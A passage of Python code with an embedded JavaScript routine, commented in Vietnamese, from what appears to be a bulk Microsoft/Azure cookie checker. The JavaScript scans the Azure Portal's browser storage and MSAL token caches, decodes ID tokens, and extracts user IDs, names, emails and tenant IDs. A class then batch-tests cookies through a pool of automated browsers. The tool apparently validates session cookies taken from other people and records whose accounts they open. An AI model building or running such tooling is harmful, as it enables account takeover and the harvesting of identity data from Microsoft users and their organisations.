                    debug: {
                        localStorage: {},
                        sessionStorage: {},
                        storage_scan: {
                            localStorage: {
                                keysFound: [],
                                userRelatedKeysFound: []
                            },
                            sessionStorage: {
                                keysFound: [],
                                userRelatedKeysFound: [],
                                accountKeys: [],
                                tokenKeys: []
                            }
                        },
                        errors: [],
                        timing: {
                            start: Date.now()
                        }
                    }
                };

                try {
                    // PHẦN MỚI: Quét toàn bộ localStorage và sessionStorage để tìm khóa liên quan
                    // Tiện lợi khi cấu trúc Azure Portal thay đổi
                    
                    // 0. Quét tất cả keys trong localStorage
                    result.debug.storage_scan.localStorage.keysFound = Object.keys(localStorage);
                    
                    // Tìm các key có thể chứa thông tin người dùng
                    result.debug.storage_scan.localStorage.userRelatedKeysFound = Object.keys(localStorage).filter(key => {
                        const lowerKey = key.toLowerCase();
                        return lowerKey.includes('user') || 
                               lowerKey.includes('account') || 
                               lowerKey.includes('profile') || 
                               lowerKey.includes('auth') ||
                               lowerKey.includes('tenant') ||
                               lowerKey.includes('directory') ||
                               lowerKey.includes('domain') ||
                               lowerKey.includes('token') ||
                               lowerKey.includes('login');
                    });
                    
                    // 0.1 Quét tất cả keys trong sessionStorage
                    result.debug.storage_scan.sessionStorage.keysFound = Object.keys(sessionStorage);
                    
                    // Tìm các key có thể chứa thông tin người dùng
                    result.debug.storage_scan.sessionStorage.userRelatedKeysFound = Object.keys(sessionStorage).filter(key => {
                        const lowerKey = key.toLowerCase();
                        return lowerKey.includes('user') || 
                               lowerKey.includes('account') || 
                               lowerKey.includes('profile') || 
                               lowerKey.includes('auth') ||
                               lowerKey.includes('tenant') ||
                               lowerKey.includes('directory') ||
                               lowerKey.includes('domain') ||
                               lowerKey.includes('token') ||
                               lowerKey.includes('login') ||
                               lowerKey.includes('msal');
                    });
                    
                    // Các key liên quan đến account và token đặc biệt
                    result.debug.storage_scan.sessionStorage.accountKeys = Object.keys(sessionStorage).filter(key => 
                        key.includes('account') && !key.includes('account.keys')
                    );
                    
                    result.debug.storage_scan.sessionStorage.tokenKeys = Object.keys(sessionStorage).filter(key => 
                        key.includes('token') && !key.includes('token.keys')
                    );

                    // 1. CHIẾN LƯỢC MỚI: Phân tích từng phương pháp trích xuất riêng biệt để dễ debug
                    
                    // 1.1 Phương pháp trực tiếp từ localStorage (đơn giản nhất)
                    try {
                        // SavedDefaultDirectory thường chứa tenant ID
                        const tenantId = localStorage.getItem('SavedDefaultDirectory');
                        if (tenantId) {
                            result.tenant.id = tenantId;
                            result.dataSources.push('localStorage.SavedDefaultDirectory');
                        }
                        
                        // Thử lấy tenantId từ các key liên quan đến tenant
                        if (!result.tenant.id) {
                            const tenantKeys = result.debug.storage_scan.localStorage.userRelatedKeysFound.filter(k => 
                                k.toLowerCase().includes('tenant') || k.toLowerCase().includes('directory')
                            );
                            
                            for (const key of tenantKeys) {
                                try {
                                    const value = localStorage.getItem(key);
                                    if (value && (value.length === 36 || value.includes('-'))) {
                                        result.tenant.id = value;
                                        result.dataSources.push(`localStorage.${key}`);
                                        break;
                                    }
                                } catch (e) {
                                    result.debug.errors.push(`Error reading localStorage.${key}: ${e.message}`);
                                }
                            }
                        }
                        
                        // Lấy domain từ các key liên quan
                        const domainKeys = ['preferred-domain', 'preferredDomain', 'domain', 'tenantDomain'];
                        for (const key of domainKeys) {
                            const domain = localStorage.getItem(key);
                            if (domain && domain.includes('.')) {
                                result.tenant.domain = domain;
                                result.dataSources.push(`localStorage.${key}`);
                                break;
                            }
                        }
                        
                        // Tìm các key chứa thông tin người dùng dạng JSON
                        const userProfileKeys = result.debug.storage_scan.localStorage.userRelatedKeysFound.filter(k => 
                            k.toLowerCase().includes('user') || k.toLowerCase().includes('profile')
                        );
                        
                        for (const key of userProfileKeys) {
                            try {
                                const value = localStorage.getItem(key);
                                if (value && value.startsWith('{')) {
                                    const userData = JSON.parse(value);
                                    
                                    // Tìm displayName hoặc name
                                    if (!result.user.displayName && (userData.displayName || userData.name)) {
                                        result.user.displayName = userData.displayName || userData.name;
                                        result.dataSources.push(`localStorage.${key}.displayName`);
                                    }
                                    
                                    // Tìm email hoặc upn
                                    if (!result.user.email && (userData.email || userData.upn || userData.userPrincipalName)) {
                                        result.user.email = userData.email || userData.upn || userData.userPrincipalName;
                                        result.dataSources.push(`localStorage.${key}.email`);
                                    }
                                    
                                    // Tìm userId hoặc oid
                                    if (!result.user.userId && (userData.userId || userData.oid || userData.objectId)) {
                                        result.user.userId = userData.userId || userData.oid || userData.objectId;
                                        result.dataSources.push(`localStorage.${key}.userId`);
                                    }
                                }
                            } catch (e) {
                                // Bỏ qua lỗi phân tích JSON
                                result.debug.errors.push(`Error parsing localStorage.${key}: ${e.message}`);
                            }
                        }
                        
                    } catch (localStorageError) {
                        result.debug.errors.push(`LocalStorage extract error: ${localStorageError.message}`);
                    }
                    
                    // 2. Phương pháp từ sessionStorage - MSAL Account Keys (phương pháp chính)
                    try {
                        // Tìm tất cả keys liên quan đến account 
                        let accountKeysFound = false;
                        let accountKeys = [];
                        
                        // 2.1 Thử tìm qua msal.account.keys (chuẩn)
                        const accountKeysStr = sessionStorage.getItem('msal.account.keys');
                        if (accountKeysStr) {
                            try {
                                accountKeys = JSON.parse(accountKeysStr);
                                accountKeysFound = true;
                                result.debug.sessionStorage['msal.account.keys_parsed'] = true;
                            } catch (e) {
                                result.debug.errors.push(`Error parsing msal.account.keys: ${e.message}`);
                            }
                        }
                        
                        // 2.2 Nếu không tìm thấy qua msal.account.keys, tìm qua các pattern khác
                        if (!accountKeysFound) {
                            // Tìm kiếm các key có chứa 'account.keys' hoặc tương tự
                            const accountKeyPattern = Object.keys(sessionStorage).filter(key => 
                                key.includes('account.keys') || 
                                key.includes('accounts.keys') ||
                                key.includes('accountkeys')
                            );
                            
                            for (const keyPattern of accountKeyPattern) {
                                try {
                                    const data = sessionStorage.getItem(keyPattern);
                                    if (data) {
                                        const keysData = JSON.parse(data);
                                        if (Array.isArray(keysData) && keysData.length > 0) {
                                            accountKeys = keysData;
                                            accountKeysFound = true;
                                            result.debug.sessionStorage['alternative_account_keys'] = keyPattern;
                                            break;
                                        }
                                    }
                                } catch (e) {
                                    result.debug.errors.push(`Error parsing alternative account key ${keyPattern}: ${e.message}`);
                                }
                            }
                        }
                        
                        // 2.3 Nếu vẫn không tìm thấy, tìm trực tiếp các key phù hợp với pattern
                        if (!accountKeysFound) {
                            const directAccountKeys = result.debug.storage_scan.sessionStorage.accountKeys;
                            if (directAccountKeys.length > 0) {
                                accountKeys = directAccountKeys;
                                accountKeysFound = true;
                                result.debug.sessionStorage['direct_account_keys_found'] = directAccountKeys.length;
                            }
                        }
                        
                        // 2.4 Xử lý dữ liệu account nếu đã tìm thấy accountKeys
                        if (accountKeysFound && accountKeys.length > 0) {
                            // Lưu danh sách keys tìm thấy để debug
                            result.debug.sessionStorage['account_keys_found'] = accountKeys;
                            
                            // Phân tích từng account key
                            for (const accountKey of accountKeys) {
                                try {
                                    const accountDataStr = sessionStorage.getItem(accountKey);
                                    if (!accountDataStr) continue;
                                    
                                    const accountData = JSON.parse(accountDataStr);
                                    result.debug.sessionStorage[`account_data_for_${accountKey.substring(0, 20)}`] = 'parsed';
                                    
                                    // Check IdP - xác định tài khoản cá nhân
                                    if (accountData.idTokenClaims && accountData.idTokenClaims.idp) {
                                        result.idp = accountData.idTokenClaims.idp;
                                    }
                                    
                                    // Trích xuất userId - ưu tiên oid từ idTokenClaims
                                    if (accountData.idTokenClaims && accountData.idTokenClaims.oid) {
                                        result.user.userId = accountData.idTokenClaims.oid;
                                        result.dataSources.push('accountData.idTokenClaims.oid');
                                    } else if (accountData.localAccountId) {
                                        result.user.userId = accountData.localAccountId;
                                        result.dataSources.push('accountData.localAccountId');
                                    } else if (accountData.homeAccountId) {
                                        // Trong một số trường hợp, homeAccountId có thể chứa oid
                                        const parts = accountData.homeAccountId.split('.');
                                        if (parts.length > 0 && parts[0].length === 36) {
                                            result.user.userId = parts[0];
                                            result.dataSources.push('accountData.homeAccountId');
                                        }
                                    }
                                    
                                    // Lưu các ID thay thế cho việc debug
                                    if (accountData.localAccountId || accountData.homeAccountId) {
                                        result.user.alternativeIds.push({
                                            localAccountId: accountData.localAccountId,
                                            homeAccountId: accountData.homeAccountId
                                        });
                                    }
                                    
                                    // Trích xuất displayName - ưu tiên name từ idTokenClaims
                                    if (accountData.idTokenClaims && accountData.idTokenClaims.name) {
                                        result.user.displayName = accountData.idTokenClaims.name;
                                        result.dataSources.push('accountData.idTokenClaims.name');
                                    } else if (accountData.name) {
                                        result.user.displayName = accountData.name;
                                        result.dataSources.push('accountData.name');
                                    }
                                    
                                    // Trích xuất email/username/upn
                                    if (accountData.idTokenClaims && accountData.idTokenClaims.upn) {
                                        result.user.upn = accountData.idTokenClaims.upn;
                                        if (!result.user.email) {
                                            result.user.email = accountData.idTokenClaims.upn;
                                            result.dataSources.push('accountData.idTokenClaims.upn');
                                        }
                                    }
                                    
                                    if (accountData.idTokenClaims && accountData.idTokenClaims.email && !result.user.email) {
                                        result.user.email = accountData.idTokenClaims.email;
                                        result.dataSources.push('accountData.idTokenClaims.email');
                                    }
                                    
                                    if (accountData.username && !result.user.email) {
                                        result.user.email = accountData.username;
                                        result.dataSources.push('accountData.username');
                                    }
                                    
                                    // Lấy domain từ email nếu chưa có
                                    if (!result.tenant.domain && result.user.email && result.user.email.includes('@')) {
                                        result.tenant.domain = result.user.email.split('@')[1];
                                        result.dataSources.push('email_domain');
                                    }
                                    
                                    // Lấy tenantId từ idTokenClaims nếu chưa có
                                    if (!result.tenant.id && accountData.idTokenClaims && accountData.idTokenClaims.tid) {
                                        result.tenant.id = accountData.idTokenClaims.tid;
                                        result.dataSources.push('accountData.idTokenClaims.tid');
                                    }
                                    
                                    // Nếu tìm thấy đủ thông tin cần thiết, có thể dừng
                                    if (result.user.userId && result.user.displayName && result.tenant.domain) {
                                        break;
                                    }
                                } catch (e) {
                                    result.debug.errors.push(`Error processing account data for ${accountKey}: ${e.message}`);
                                }
                            }
                        } else {
                            result.debug.errors.push("No account keys found in known patterns");
                        }
                    } catch (sessionStorageError) {
                        result.debug.errors.push(`SessionStorage account extract error: ${sessionStorageError.message}`);
                    }
                    
                    // 3. Phương pháp từ ID Token (bổ sung)
                    try {
                        let idTokenKeys = [];
                        let tokenKeysFound = false;
                        
                        // 3.1 Tìm qua msal.token.keys (chuẩn)
                        const tokenKeysStr = sessionStorage.getItem('msal.token.keys');
                        if (tokenKeysStr) {
                            try {
                                const tokenKeys = JSON.parse(tokenKeysStr);
                                if (tokenKeys && tokenKeys.idToken && tokenKeys.idToken.length > 0) {
                                    idTokenKeys = tokenKeys.idToken;
                                    tokenKeysFound = true;
                                    result.debug.sessionStorage['msal.token.keys_parsed'] = true;
                                }
                            } catch (e) {
                                result.debug.errors.push(`Error parsing msal.token.keys: ${e.message}`);
                            }
                        }
                        
                        // 3.2 Tìm qua các pattern khác nếu chưa tìm thấy
                        if (!tokenKeysFound) {
                            const tokenKeyPatterns = Object.keys(sessionStorage).filter(key => 
                                key.includes('token.keys') || 
                                key.includes('tokens.keys') ||
                                key.includes('tokenkeys')
                            );
                            
                            for (const keyPattern of tokenKeyPatterns) {
                                try {
                                    const data = sessionStorage.getItem(keyPattern);
                                    if (data) {
                                        const parsedData = JSON.parse(data);
                                        if (parsedData && parsedData.idToken && parsedData.idToken.length > 0) {
                                            idTokenKeys = parsedData.idToken;
                                            tokenKeysFound = true;
                                            result.debug.sessionStorage['alternative_token_keys'] = keyPattern;
                                            break;
                                        }
                                    }
                                } catch (e) {
                                    result.debug.errors.push(`Error parsing alternative token key ${keyPattern}: ${e.message}`);
                                }
                            }
                        }
                        
                        // 3.3 Nếu vẫn không tìm thấy, tìm trực tiếp các key phù hợp với pattern
                        if (!tokenKeysFound) {
                            const directTokenKeys = result.debug.storage_scan.sessionStorage.tokenKeys;
                            if (directTokenKeys.length > 0) {
                                idTokenKeys = directTokenKeys;
                                tokenKeysFound = true;
                                result.debug.sessionStorage['direct_token_keys_found'] = directTokenKeys.length;
                            }
                        }
                        
                        // 3.4 Phân tích JWT từ ID token nếu tìm thấy
                        if (tokenKeysFound && idTokenKeys.length > 0) {
                            result.debug.sessionStorage['id_token_keys_found'] = idTokenKeys.length;
                            
                            for (const tokenKey of idTokenKeys) {
                                try {
                                    const tokenDataStr = sessionStorage.getItem(tokenKey);
                                    if (!tokenDataStr) continue;
                                    
                                    const tokenData = JSON.parse(tokenDataStr);
                                    result.debug.sessionStorage[`token_data_for_${tokenKey.substring(0, 20)}`] = 'parsed';
                                    
                                    if (tokenData.secret) {
                                        const jwt = parseJwt(tokenData.secret);
                                        result.debug.sessionStorage[`jwt_for_${tokenKey.substring(0, 20)}`] = 'parsed';
                                        
                                        // Kiểm tra IdP nếu chưa có
                                        if (!result.idp && jwt.idp) {
                                            result.idp = jwt.idp;
                                        }
                                        
                                        // Cập nhật thông tin nếu chưa có
                                        if (!result.user.userId && jwt.oid) {
                                            result.user.userId = jwt.oid;
                                            result.dataSources.push('jwt.oid');
                                        }
                                        
                                        if (!result.user.displayName && jwt.name) {
                                            result.user.displayName = jwt.name;
                                            result.dataSources.push('jwt.name');
                                        }
                                        
                                        if (!result.user.email) {
                                            if (jwt.upn) {
                                                result.user.upn = jwt.upn;
                                                result.user.email = jwt.upn;
                                                result.dataSources.push('jwt.upn');
                                            } else if (jwt.email) {
                                                result.user.email = jwt.email;
                                                result.dataSources.push('jwt.email');
                                            } else if (jwt.preferred_username) {
                                                result.user.email = jwt.preferred_username;
                                                result.dataSources.push('jwt.preferred_username');
                                            }
                                        }
                                        
                                        if (!result.tenant.id && jwt.tid) {
                                            result.tenant.id = jwt.tid;
                                            result.dataSources.push('jwt.tid');
                                        }
                                        
                                        // Thêm tìm kiếm domain từ email trong token
                                        if (!result.tenant.domain) {
                                            if (jwt.email && jwt.email.includes('@')) {
                                                result.tenant.domain = jwt.email.split('@')[1];
                                                result.dataSources.push('jwt.email_domain');
                                            } else if (jwt.upn && jwt.upn.includes('@')) {
                                                result.tenant.domain = jwt.upn.split('@')[1];
                                                result.dataSources.push('jwt.upn_domain');
                                            }
                                        }
                                        
                                        // Nếu tìm thấy đủ thông tin cần thiết, có thể dừng
                                        if (result.user.userId && result.user.displayName && result.tenant.domain) {
                                            break;
                                        }
                                    }
                                } catch (e) {
                                    result.debug.errors.push(`Error processing token data for ${tokenKey}: ${e.message}`);
                                }
                            }
                        } else {
                            result.debug.errors.push("No token keys found in known patterns");
                        }
                    } catch (tokenError) {
                        result.debug.errors.push(`Token extract error: ${tokenError.message}`);
                    }
                    
                    // 4. Tìm trong các key sessionStorage cụ thể khác (phương pháp bổ sung)
                    try {
                        if (!result.user.userId || !result.user.displayName || !result.tenant.domain) {
                            // Quét các key có chứa thông tin người dùng
                            const userDataKeys = result.debug.storage_scan.sessionStorage.userRelatedKeysFound.filter(k => 
                                k.toLowerCase().includes('user') || 
                                k.toLowerCase().includes('profile') || 
                                k.toLowerCase().includes('authdata')
                            );
                            
                            for (const key of userDataKeys) {
                                try {
                                    const value = sessionStorage.getItem(key);
                                    if (!value || !value.startsWith('{')) continue;
                                    
                                    const userData = JSON.parse(value);
                                    
                                    // Tìm các thuộc tính phổ biến
                                    if (!result.user.userId) {
                                        const candidateId = userData.oid || userData.objectId || userData.userId || 
                                                           (userData.user && userData.user.objectId) ||
                                                           (userData.account && userData.account.objectId);
                                        
                                        if (candidateId && (candidateId.length === 36 || candidateId.includes('-'))) {
                                            result.user.userId = candidateId;
                                            result.dataSources.push(`sessionStorage.${key}.userId`);
                                        }
                                    }
                                    
                                    if (!result.user.displayName) {
                                        const candidateName = userData.displayName || userData.name || 
                                                            (userData.user && userData.user.displayName) ||
                                                            (userData.account && userData.account.name);
                                        
                                        if (candidateName) {
                                            result.user.displayName = candidateName;
                                            result.dataSources.push(`sessionStorage.${key}.displayName`);
                                        }
                                    }
                                    
                                    if (!result.user.email) {
                                        const candidateEmail = userData.email || userData.upn || userData.userPrincipalName ||
                                                             (userData.user && userData.user.email) ||
                                                             (userData.account && userData.account.username);
                                        
                                        if (candidateEmail && candidateEmail.includes('@')) {
                                            result.user.email = candidateEmail;
                                            result.dataSources.push(`sessionStorage.${key}.email`);
                                            
                                            // Lấy domain từ email nếu chưa có
                                            if (!result.tenant.domain) {
                                                result.tenant.domain = candidateEmail.split('@')[1];
                                                result.dataSources.push(`sessionStorage.${key}.emailDomain`);
                                            }
                                        }
                                    }
                                    
                                    if (!result.tenant.id) {
                                        const candidateTenantId = userData.tid || userData.tenantId ||
                                                               (userData.tenant && userData.tenant.id) ||
                                                               (userData.account && userData.account.tenantId);
                                        
                                        if (candidateTenantId && (candidateTenantId.length === 36 || candidateTenantId.includes('-'))) {
                                            result.tenant.id = candidateTenantId;
                                            result.dataSources.push(`sessionStorage.${key}.tenantId`);
                                        }
                                    }
                                    
                                    // Nếu tìm thấy đủ thông tin cần thiết, có thể dừng
                                    if (result.user.userId && result.user.displayName && result.tenant.domain) {
                                        break;
                                    }
                                } catch (e) {
                                    // Bỏ qua lỗi phân tích JSON
                                }
                            }
                        }
                    } catch (additionalError) {
                        result.debug.errors.push(`Additional extraction error: ${additionalError.message}`);
                    }
                    
                    // 5. BỔ SUNG: Tìm kiếm các API response trong sessionStorage (thường chứa thông tin người dùng)
                    try {
                        if (!result.user.userId || !result.user.displayName || !result.tenant.domain) {
                            // Tìm kiếm các key chứa response API
                            const apiResponseKeys = Object.keys(sessionStorage).filter(key => 
                                key.includes('api') || key.includes('response') || key.includes('fetch') || key.includes('cache')
                            );
                            
                            for (const key of apiResponseKeys) {
                                try {
                                    const value = sessionStorage.getItem(key);
                                    if (!value || !value.startsWith('{')) continue;
                                    
                                    const apiData = JSON.parse(value);
                                    
                                    // Quét đệ quy để tìm thuộc tính chứa thông tin
                                    const findUserInfo = (obj, path = '') => {
                                        if (!obj || typeof obj !== 'object') return;
                                        
                                        // Kiểm tra các thuộc tính phổ biến
                                        if (!result.user.userId && (obj.oid || obj.objectId)) {
                                            result.user.userId = obj.oid || obj.objectId;
                                            result.dataSources.push(`${path}.oid/objectId`);
                                        }
                                        
                                        if (!result.user.displayName && (obj.displayName || obj.name)) {
                                            result.user.displayName = obj.displayName || obj.name;
                                            result.dataSources.push(`${path}.displayName/name`);
                                        }
                                        
                                        if (!result.user.email && (obj.email || obj.upn || obj.userPrincipalName)) {
                                            result.user.email = obj.email || obj.upn || obj.userPrincipalName;
                                            result.dataSources.push(`${path}.email/upn`);
                                            
                                            // Lấy domain từ email nếu chưa có
                                            if (!result.tenant.domain && result.user.email.includes('@')) {
                                                result.tenant.domain = result.user.email.split('@')[1];
                                                result.dataSources.push(`${path}.emailDomain`);
                                            }
                                        }
                                        
                                        if (!result.tenant.id && (obj.tid || obj.tenantId)) {
                                            result.tenant.id = obj.tid || obj.tenantId;
                                            result.dataSources.push(`${path}.tid/tenantId`);
                                        }
                                        
                                        // Duyệt đệ quy các thuộc tính con
                                        for (const prop in obj) {
                                            if (obj[prop] && typeof obj[prop] === 'object') {
                                                findUserInfo(obj[prop], `${path}.${prop}`);
                                            }
                                        }
                                    };
                                    
                                    findUserInfo(apiData, `sessionStorage.${key}`);
                                    
                                    // Nếu tìm thấy đủ thông tin cần thiết, có thể dừng
                                    if (result.user.userId && result.user.displayName && result.tenant.domain) {
                                        break;
                                    }
                                } catch (e) {
                                    // Bỏ qua lỗi phân tích JSON
                                }
                            }
                        }
                    } catch (apiResponseError) {
                        result.debug.errors.push(`API response extraction error: ${apiResponseError.message}`);
                    }
                    
                    // 6. Kiểm tra tính hợp lệ của userId (định dạng UUID)
                    const isValidUUID = result.user.userId && 
                                    /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(result.user.userId);
                    result.debug.isValidUUID = isValidUUID;
                                    
                    // 7. Kiểm tra displayName và domain
                    const hasDisplayName = result.user.displayName !== undefined && 
                                        result.user.displayName !== null && 
                                        result.user.displayName.trim() !== '';
                    result.debug.hasDisplayName = hasDisplayName;
                    
                    const hasDomain = result.tenant.domain !== undefined && 
                                    result.tenant.domain !== null && 
                                    result.tenant.domain.trim() !== '';
                    result.debug.hasDomain = hasDomain;
                                    
                    // Đánh dấu tài khoản hợp lệ - CHỈ cần có userId dạng UUID VÀ displayName xác định VÀ domain
                    result.isValid = isValidUUID && hasDisplayName && hasDomain;
                    
                    // Thêm thông tin URL
                    result.debug.url = window.location.href;
                    result.debug.title = document.title;
                    
                    // Thời gian thực thi
                    result.debug.timing.end = Date.now();
                    result.debug.timing.duration = result.debug.timing.end - result.debug.timing.start;
                    
                } catch (error) {
                    result.debug.errors.push("Critical error: " + error.message);
                    result.debug.criticalError = error.stack || error.toString();
                }
                
                return result;
            }

            // Hàm phân tích JWT token
            function parseJwt(token) {
                try {
                    // Kiểm tra JWT hợp lệ - phải có ít nhất 2 dấu chấm để chia thành 3 phần
                    if (!token || typeof token !== 'string' || !token.includes('.')) {
                        return {};
                    }
                    
                    const base64Url = token.split('.')[1];
                    if (!base64Url) return {};
                    
                    // Chuẩn hóa base64 (thay thế '-' bằng '+' và '_' bằng '/')
                    const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
                    
                    // Thêm padding nếu cần
                    const paddedBase64 = base64.padEnd(base64.length + (4 - base64.length % 4) % 4, '=');
                    
                    // Decode base64
                    try {
                        // Cách 1: Dùng atob và escape
                        const jsonPayload = decodeURIComponent(atob(paddedBase64).split('').map(function(c) {
                            return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
                        }).join(''));
                        return JSON.parse(jsonPayload);
                    } catch (atobError) {
                        try {
                            // Cách 2: Dùng TextDecoder (backup)
                            const binary = window.atob(paddedBase64);
                            const bytes = new Uint8Array(binary.length);
                            for (let i = 0; i < binary.length; i++) {
                                bytes[i] = binary.charCodeAt(i);
                            }
                            const decoder = new TextDecoder();
                            const text = decoder.decode(bytes);
                            return JSON.parse(text);
                        } catch (e) {
                            return {};
                        }
                    }
                } catch (e) {
                    return {};
                }
            }

            // Thực thi trích xuất
            return extractCriticalAzureData();
            """
            
            # Thực thi script được tối ưu với timeout tăng lên
            self.logger.debug("Thực thi script JavaScript để trích xuất dữ liệu từ storage")
            storage_result = driver.execute_script(optimized_script)
            script_time = time.time() - start_time
            self.logger.debug(f"Thời gian thực thi script: {script_time:.3f}s")
            
            # Kiểm tra kết quả từ script
            if storage_result is None:
                details["api_error"] = "Script JavaScript không trả về kết quả (null)"
                self.logger.warning("Script trả về null, không có dữ liệu để xử lý")
                end_time = time.time() - start_time
                self.logger.info(f"Kiểm tra API đã thực thi trong {end_time:.3f}s")
                return False, details
                
            # Lưu debug info
            if 'debug' in storage_result:
                debug_info = storage_result.get('debug', {})
                details["debug_info"].update(debug_info)
                
                # Ghi log lỗi JavaScript nếu có
                js_errors = debug_info.get('errors', [])
                if js_errors:
                    self.logger.debug(f"JavaScript errors: {', '.join(js_errors[:3])}")
                
                # CÁCH TỐT HƠN: Thêm log cho tất cả các key tìm thấy trong localStorage và sessionStorage
                storage_scan = debug_info.get('storage_scan', {})
                if storage_scan:
                    try:
                        # Ghi log các key trong localStorage liên quan đến user
                        local_user_keys = storage_scan.get('localStorage', {}).get('userRelatedKeysFound', [])
                        if local_user_keys:
                            local_keys_sample = local_user_keys[:5] if len(local_user_keys) > 5 else local_user_keys
                            self.logger.debug(f"localStorage user-related keys ({len(local_user_keys)} total): {', '.join(local_keys_sample)}")
                            
                        # Ghi log các key trong sessionStorage liên quan đến user
                        session_user_keys = storage_scan.get('sessionStorage', {}).get('userRelatedKeysFound', [])
                        if session_user_keys:
                            session_keys_sample = session_user_keys[:5] if len(session_user_keys) > 5 else session_user_keys
                            self.logger.debug(f"sessionStorage user-related keys ({len(session_user_keys)} total): {', '.join(session_keys_sample)}")
                            
                        # Ghi log các key account 
                        account_keys = storage_scan.get('sessionStorage', {}).get('accountKeys', [])
                        if account_keys:
                            account_keys_sample = account_keys[:3] if len(account_keys) > 3 else account_keys
                            self.logger.debug(f"Account keys found ({len(account_keys)} total): {', '.join(account_keys_sample)}")
                            
                        # Ghi log các key token
                        token_keys = storage_scan.get('sessionStorage', {}).get('tokenKeys', [])
                        if token_keys:
                            token_keys_sample = token_keys[:3] if len(token_keys) > 3 else token_keys
                            self.logger.debug(f"Token keys found ({len(token_keys)} total): {', '.join(token_keys_sample)}")
                    except Exception as scan_e:
                        self.logger.debug(f"Error logging storage scan results: {str(scan_e)}")
                    
            # Xử lý kết quả trả về từ storage
            details["user_id"] = storage_result.get('user', {}).get('userId')
            details["display_name"] = storage_result.get('user', {}).get('displayName')
            details["domain_name"] = storage_result.get('tenant', {}).get('domain')
            details["tenant_id"] = storage_result.get('tenant', {}).get('id')
            details["is_valid_account"] = storage_result.get('isValid', False)
            details["email"] = storage_result.get('user', {}).get('email')
            details["data_source"] = ", ".join(storage_result.get('dataSources', [])[:3])
            details["idp"] = storage_result.get('idp')
            
            # Thêm thông tin UPN nếu có (Phổ biến trong Azure AD)
            details["upn"] = storage_result.get('user', {}).get('upn')
            
            # CÁCH TỐT HƠN: Ghi log chi tiết về dữ liệu tìm được
            if details["user_id"] or details["display_name"] or details["domain_name"]:
                log_parts = []
                if details["user_id"]:
                    log_parts.append(f"userId={details['user_id']}")
                if details["display_name"]:
                    log_parts.append(f"displayName={details['display_name']}")
                if details["domain_name"]:
                    log_parts.append(f"domain={details['domain_name']}")
                if details["email"]:
                    log_parts.append(f"email={details['email']}")
                if details["tenant_id"]:
                    log_parts.append(f"tenantId={details['tenant_id']}")
                
                self.logger.debug(f"Dữ liệu từ storage: {', '.join(log_parts)}")
            else:
                self.logger.debug("Không tìm thấy dữ liệu người dùng trong storage")
            
            # Kiểm tra định dạng UUID chuẩn
            is_valid_uuid = bool(details["user_id"] and re.match(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', details["user_id"], re.IGNORECASE))
            
            # Kiểm tra đủ thông tin cần thiết VÀ userId có định dạng UUID chuẩn
            api_check_status = bool(details["user_id"] and details["display_name"] and details["domain_name"] and is_valid_uuid)
            details["api_check_status"] = api_check_status
            
            # Lưu thông tin tổng hợp để debug
            details["debug_info"]["final_check"] = {
                "has_user_id": bool(details["user_id"]),
                "has_display_name": bool(details["display_name"]),
                "has_domain_name": bool(details["domain_name"]),
                "is_valid_uuid": is_valid_uuid,
                "api_check_status": api_check_status
            }
            
            # Hoàn tất xử lý và trả về kết quả
            end_time = time.time() - start_time
            
            # Nếu tài khoản có đủ thông tin và userId đúng định dạng UUID - trả về thành công
            if api_check_status:
                self.logger.info(f"Lấy thông tin thành công: {details['display_name']}, {details['domain_name']}")
                self.logger.info(f"Kiểm tra API đã thực thi trong {end_time:.3f}s")
                return True, details
            
            # Nếu có thông tin cơ bản nhưng userId không đúng định dạng UUID
            elif details["user_id"] and details["display_name"] and details["domain_name"]:
                error_msg = f"userId không phải UUID chuẩn: {details['user_id']}"
                self.logger.warning(error_msg)
                details["api_error"] = error_msg
                self.logger.info(f"Kiểm tra API đã thực thi trong {end_time:.3f}s")
                return False, details
            
            # Trường hợp thiếu thông tin - ghi nhận chi tiết các trường bị thiếu
            elif details["user_id"] or details["display_name"] or details["domain_name"]:
                missing = []
                if not details["user_id"]: missing.append("user_id")
                if not details["display_name"]: missing.append("display_name")
                if not details["domain_name"]: missing.append("domain_name")
                error_msg = f"Thiếu thông tin: {', '.join(missing)}"
                self.logger.warning(error_msg)
                details["api_error"] = error_msg
                self.logger.info(f"Kiểm tra API đã thực thi trong {end_time:.3f}s")
                return False, details
            
            # Không tìm thấy thông tin
            else:
                error_msg = "Không tìm thấy thông tin người dùng trong storage"
                self.logger.warning(error_msg)
                details["api_error"] = error_msg
                self.logger.info(f"Kiểm tra API đã thực thi trong {end_time:.3f}s")
                return False, details
                
        except WebDriverException as e:
            end_time = time.time() - start_time
            error_msg = str(e)
            details["api_error"] = f"WebDriver lỗi: {error_msg}"
            
            if "no such window" in error_msg.lower():
                self.logger.warning("Cửa sổ đã đóng khi truy cập storage")
            else:
                self.logger.warning(f"Lỗi WebDriver khi lấy dữ liệu từ storage: {error_msg}")
                
            self.logger.info(f"Kiểm tra API đã thực thi trong {end_time:.3f}s")
            return False, details
            
        except Exception as e:
            end_time = time.time() - start_time
            error_msg = f"{type(e).__name__}: {str(e)}"
            details["api_error"] = error_msg
            self.logger.warning(f"Lỗi khi lấy dữ liệu từ storage: {error_msg}")
            self.logger.info(f"Kiểm tra API đã thực thi trong {end_time:.3f}s")
            return False, details

# --- CookieChecker ---
class CookieChecker:
    """
    Lớp kiểm tra cookie Microsoft/Azure với hiệu suất được tối ưu.
    Các cải tiến:
    - Sử dụng WebDriver Pool để tái sử dụng driver
    - Adaptive batch processing để tối ưu hiệu suất
    - Kiểm tra đăng nhập đa phương pháp
    - Xác thực thông tin người dùng qua API GetEarlyUserData
    - Tách biệt logic kiểm tra thành các thành phần riêng biệt
    - Cơ chế retry thông minh và xử lý lỗi mạnh mẽ
    """

    def __init__(
        self,
        config: SimpleConfig,
        driver_pool: WebDriverPool,
        result_manager: ResultManager,
        logger_instance: Optional[logging.Logger] = None,
        auto_save_results: bool = True,
        cookie_processor: Optional[CookieProcessor] = None,
        login_verifier: Optional[LoginVerifier] = None,
        api_verifier: Optional[ApiVerifier] = None
    ):
        self.config = config
        self.driver_pool = driver_pool
        self.result_manager = result_manager
        self.logger = logger_instance if logger_instance else logging.getLogger(__name__)
        self.auto_save_results = auto_save_results
        self.cookie_processor = cookie_processor or CookieProcessor(
            domain_url_map=self.config.domain_url_map,
            logger=self.logger
        )
